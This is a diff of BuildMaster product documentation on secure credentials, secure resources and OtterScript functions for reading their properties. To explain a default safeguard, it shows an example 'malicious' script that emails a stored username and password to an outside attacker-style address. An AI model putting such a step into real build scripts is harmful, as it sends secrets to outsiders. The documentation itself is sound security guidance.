@@ -1,38 +1,69 @@
 ---
-title: Resource Credentials
+title: Credentials & Resources
 keywords: buildmaster, executions, resource-credentials
 show-headings-in-nav: true
 sequence: 200
 ---
 
-Resource credentials store information that is used to provide access to a particular resource (such as a name and password to a specific service), and may contain secrets (i.e. encrypted fields that are visible only to privileged users, like passwords or API keys).
+BuildMaster has two related features that help you share resources across applications:
 
-There are a few types that are built in to BuildMaster:
+* **Secure Credentials** store accounts, logins, and access keys that contain secrets (i.e. encrypted fields that are visible only to privileged users)
+* **Secure Resources**  provide access to a particular resource (such as a Git repository), and may be associated with a Secure Credential
 
-|Type|	Properties	|Description|
-|-|-|-|
-|UsernamePassword	|UserName Password|	A general-purpose credential with a username and password, such as a Windows domain account. Several operations can use this to request a basic username/password. |
-|PrivateKey	| UserName PublicKey PrivateKey* Passphrase*	| This is primarily used by the SSH-based agent when key-based authentication is used. |
-|InedoProduct	| Host ApiKey* |	Represents a connection to instance of another Inedo product (BuildMaster, ProGet, or Otter) |
+### Secure Credential & Secure Resource Types
+There are a few types of credentials that are built-in to BuildMaster:
 
-**\*** *indicates an encrypted/sensitive field*
+* **Private Key** is primarily used by the SSH-based agent when key-based authentication is needed.
+* **Username & Password** contains a username (visible) and password (secret), and is used to represent a general-purpose account, such as a Windows domain account.
+* **API Key/Token** contains just a token property (which is secret), and is used by a variety of resources
 
-Resource credentials are implemented through an [extensible feature](/docs/buildmaster/administration/extensions), and several extensions ([JIRA](/den/buildmaster/jira),[VSTS](/den/inedox/tfs), [GitHub](/den/inedox/github), etc.) will add types that are necessary for the extension's components.
 
-## Creating and Editing Credentials {#creating-editing-credentials data-title="Creating and Editing Credentials"}
+There are also a few built-in resource types:
 
-You can create a resource credential from the Resource Credentials link on the Administration page. In addition to the fields specific to the resource credential type, all resource credentials have:
+* **Inedo BuildMaster**; Connect to an instance of BuildMaster.
+* **Inedo Otter**; Connect to an instance of Otter.
+* **Inedo ProGet**; Connect to an instance of ProGet.
+* **NuGet Package Feed**; Interact with packages on a NuGet feed.
+* **Universal Package Feed**; Interact with packages on a ProGet-hosted universal feed.
+
+However, because these are implemented as [extensions](/docs/buildmaster/administration/extensions), many integrations like [Azure DevOps](/docs/buildmaster/integrations/azure-devops/source-control), [Jira](/docs/buildmaster/integrations/jira), [Jenkins](/docs/buildmaster/integrations/jenkins), etc. will add additional types.
+
+## Creating & Editing Secure Credentials {#creating-editing-credentials data-title="Creating & Editing Secure Credentials"}
+
+You manage secure credentials under Application Settings > Credentials or Administration > Secure Credentials. 
+
+All secure credentials have the following properties:
 
 *   **Name** - a name of up to 50 characters that will be used to reference the resource credential; while you can change the name later, any operation or component that relied on that name will no longer be able to find it
+*   **Application** - indicates whether the secure credential is an application-level credential or global (shared)
 *   **Environment** - optional; restricts what environments the credential may be used in, and which users have access to it
-*   **Variable Usage** - optional; you can allow the `$CredentialProperty` variable function to extract secure properties
+*   **OtterScript Usage** - optional; you can allow the `$CredentialProperty` variable function to extract secure properties
 *   **Environment Restriction** - optional; when set, a runtime error will occur when this credential is used in a deployment plan that is not running in the same environment
 
-When editing credentials, the encrypted fields will be displayed as empty password textboxes, and entering a value in the textbox will change it. You may click the "view hidden fields" button to show these values if you have the appropriate permissions.
+Depending on the type of secure credential, there will be other fields like Username or Password that you can edit.
 
-## Limiting Credential Access {#limiting-access data-title="Limiting Credential Access"}
+Secret fields (like Password) will be displayed as an empty textbox, and entering a value in the textbox will change it. You can click the "Show Secret fields" button to show these values if you have the appropriate permissions.
 
-You may want to permit or restrict certain users from accessing certain credentials, such as allowing Developers to manage credentials in the Integration and Testing environments. This is done by associating credentials with an environment, and then creating the appropriate [access controls](/docs/buildmaster/administration/users-and-security) scoped to that environment.
+## Using Credentials and Resources {#credentials-and-otterscript data-title="Using Credentials and Resources"}
+
+Most Operations that work with resources and/or credentials will let you use a secure resource name and/or a secure credential name. 
+
+For example, although the `AzureDevOps::Get-Source` operation has all the properties necessary to connect to a Azure DevOps repository (InstanceUrl, Usernname, Token, Project, etc.), you can simply specify a configured secure resource name instead.
+
+````
+AzureDevOps::Get-Source
+(
+    From: MyAzureDevOpsResource
+);
+````
+
+At runtime, the operation will search for a secure resource named `MyAzureDevOpsResource`. If that secure resource has a secure credential name configured, then the associated secure credential will also be used. 
+
+Note that, if the credential has "restricted to environment use" configured, then this will only be permitted if the deployment plan is running in the same environment. This can be frustrating and unintuitive to your users, so be careful when using it.
+
+## Limiting Secure Credential Access {#limiting-access data-title="Limiting Secure Credential Access"}
+
+You may want to permit or restrict certain users from accessing certain secure credentials, such as allowing Developers to manage credentials in the Integration and Testing environments. This is done by associating credentials with an environment, and then creating the appropriate [access controls](/docs/buildmaster/administration/users-and-security) scoped to that environment.
 
 There are two task attributes you can use to control this access:
 
@@ -41,54 +72,58 @@ There are two task attributes you can use to control this access:
 
 On the manage credentials page, users will only see the credentials they have permission to manage, and will only be able to create credentials in permitted environments.
 
-## Credentials and OtterScript {#credentials-and-otterscript data-title="Credentials and OtterScript"}
+## Accessing Properties from OtterScript {#credentials-as-variables data-title="OtterScript Usage"}
 
-Any operation that uses passwords, API keys, or sensitive information will give you the option to use a resource credential instead of needing to put those values directly in your OtterScript.
+Most Operations will simply input the name of a Secure Resource or Secure Credential, and use the properties you've configured. However, there may be times when you need to access the configured properties, such as such as if you want to pass a username or password to a script or command-line utility.
 
-For example, consider the [`Ensure-AppPool`](/docs/buildmaster/reference/operations/iis/ensure-app-pool) operation:
+To access the properties of a configured Secure Credential or Secure Property from within OtterScript, you can use the [$SecureCredentialProperty](/docs/buildmaster/reference/functions/credentials/securecredentialproperty) and [$SecureResourceProperty](/docs/buildmaster/reference/functions/credentials/secureresourceproperty) functions.
 
-![Ensure apppool operation](/resources/documentation/buildmaster/6/ensure-app-pool.png)
+````
+set $host = $CredentialProperty(InternalProGet, ServerUrl);
 
-If you select a resource credential for the operation's, the OtterScript runtime will automatically set the value of the operations User Name and Password properties from the selected credential. If you specify a value for either of those properties, they will be used instead of the credential's value.
+exec sometool.exe --host $host;
+````
 
-::: {.attention .technical}
-If the credential has "restricted to environment use" configured, then this will only be permitted if the deployment plan is running in the same environment. This can be frustrating and unintuitive to your users, so be careful when using it.
-:::
+By default, accessing secret properties of a secure credential will raise an error. This is to prevent malicious OtterScript like this:
 
-## Credentials as Variables {#credentials-as-variables data-title="Credentials as Variables"}
-
-By default, there is no way to access the value of an encrypted/sensitive field on a credential from within OtterScript. However, at times it may be necessary, such as if you want to pass a username/password to a script or command-line utility.
-
-You can enable variable usage on a credential-by-credential basis. When configured, you can use the [$CredentialProperty](/docs/buildmaster/reference/functions/credentials/credentialproperty) variable function to extract any property value. For example:
-
-```
-set $HDarsUser = $CredentialProperty(UsernamePassword::HDarsUser, UserName);
-set $HDarsPassword = $CredentialProperty(UsernamePassword::HDarsUser, Password);
-PSExec >> Register-HDars $HdarsUser $HdarsPassword >>;        
-
+````
+# NOTE - this won't actually work unless you explciitly allow it
 Send-Email
 (
     To: hacker45@agam.ru,
     Subject: Username is $HdarsUser and password is $HdarsPassword
 );
-```
+````
 
-Instead, you should write a custom operation that can securely handle the credentials.
+If you absolutely need to access secret field on a Secure Credential (such as a Password or API Token), you'll need to enable variable usage on that credential. Here is a case where you may need to do that:
 
-## Cascading Credentials {#cascading data-title="Cascading Credentials"}
+````
+set $HDarsUser = $SecureCredentialProperty(UsernamePassword::HDarsUser, UserName);
+set $HDarsPassword = $SecureCredentialProperty(UsernamePassword::HDarsUser, Password);
+exec hdars-tool.exe --user $HdarsUser -- pass $HdarsPassword;
+````
 
-As of BuildMaster v6.1.10, resource credentials may be specified at the application or application group scope in addition to environment. Certain implementations may also specify a resource credential to inherit from, overriding specific properties at the application or group level. 
+If you have important credentials, you should strongly consider writing a custom operation that can securely handle the credentials.
+
+
+## Legacy Resource Credentials (BuildMaster 6.1) {#61 data-title="Resource Credentials (BuildMaster 6.1)"}
+Prior to BuildMaster 6.2, a single feature called "Resource Credentials" was used instead of Secure Credentials and Secure Resources. These will appear with a warning icon on the secure credentials page.
+
+While Resource Credentials are considered a "Legacy Feature", you can still create and edit them as needed. In some cases, such as custom/community extensions, they may be the only option, until the extension is adapted to use the new features.
+
+Many operations that utilize a Secure Resource will attempt to search for a Resource Credential if the specified Secure Resource was not found. This enables upgrades without breaking previous OtterScripts plans and modules. 
+
+### Converting to Secure Credentials & Resources
+You can "convert" a Resource Credential into a Secure Credentials and/or Secure Resources from the manage secure credentials page. This is a one-way conversion, so make sure to save important information (like the password) if you need to recreate it.
+
+For example, a "GitHub Resource Credential" would convert to a "GitHub Account" (Secure Credential) and a "GitHub Project" (Secure Resource), unless the Username was empty; in that case, it will only be converted to a Secure Resource.
+
+### Legacy Resource Credential Cascading Rules
+
+BuildMaster v6.1.10 introduced "cascading resource credentials", which allowed for credentials to be created at the application-group level. A resource credential could also "inherit" from another resource credential, which would cause specific properties to be overriden. 
 
 For example, an individual application's resource credentials could specify a system-level parent that has username/password information stored for a full system, and then override just the "repository URL". This way, you can specify the secret value in one location (with elevated privileges required to access it), and connect to different repositories consistently throughout all applications.
 
-The following rules are enforced by BuildMaster when creating or resolving cascading credentials:
+For security reasons, the environment of the parent credential must match the inheritor's exactly, or the parent environment must not be specified (indicating that it applies to all environments)
 
-{.docs}
- - for security reasons, the environment of the parent credential must match the inheritor's exactly, or the parent environment must not be specified (indicating that it applies to all environments)
- - when resolving a resource credential at execution time, candidates by name are selected in order of matching properties:
-    - application + environment
-    - application
-    - application group
-    - ancestor application-group
-    - environment
-    - system
+When resolving a resource credential at execution time, candidates by name are selected in order of matching properties: application + environment, application, application group, ancestor application-group, environment, system.
